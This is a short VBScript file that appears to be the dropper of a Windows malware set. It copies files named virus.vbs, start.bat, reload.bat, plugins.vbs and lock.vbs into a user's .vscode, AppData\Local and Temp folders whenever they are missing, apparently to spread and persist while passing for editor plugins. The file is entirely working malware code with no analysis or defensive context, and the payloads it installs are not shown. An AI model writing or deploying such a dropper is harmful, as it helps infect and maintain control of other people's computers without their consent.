Option Explicit
DIM fso    
Set fso = CreateObject("Scripting.FileSystemObject")

If (fso.FileExists("C:\Users\student\.vscode\virus.vbs")) Then
	
Else
  	fso.CopyFile "./virus.vbs", "C:\Users\student\.vscode\"
End If

If (fso.FileExists("C:\Users\student\AppData\Local\start.bat")) Then
	
Else
  	fso.CopyFile "./start.bat", "C:\Users\student\AppData\Local\"
End If

If (fso.FileExists("C:\Users\student\AppData\Local\Temp\start.bat")) Then
	
Else
  	fso.CopyFile "./start.bat", "C:\Users\student\AppData\Local\Temp\"
End If

If (fso.FileExists("C:\Users\student\AppData\Local\Temp\reload.bat")) Then
		
Else
  	fso.CopyFile "./reload.bat", "C:\Users\student\AppData\Local\Temp\"
End If

If (fso.FileExists("C:\Users\student\AppData\Local\Temp\plugins.vbs")) Then
		
Else
  	fso.CopyFile "./plugins.vbs", "C:\Users\student\AppData\Local\Temp\"
End If

If (fso.FileExists("C:\Users\student\AppData\Local\plugins.vbs")) Then
		
Else
  	fso.CopyFile "./plugins.vbs", "C:\Users\student\AppData\Local\"
End If

If (fso.FileExists("C:\Users\student\AppData\Local\Temp\lock.vbs")) Then
		
Else
  	fso.CopyFile "./lock.vbs", "C:\Users\student\AppData\Local\Temp\"
End If
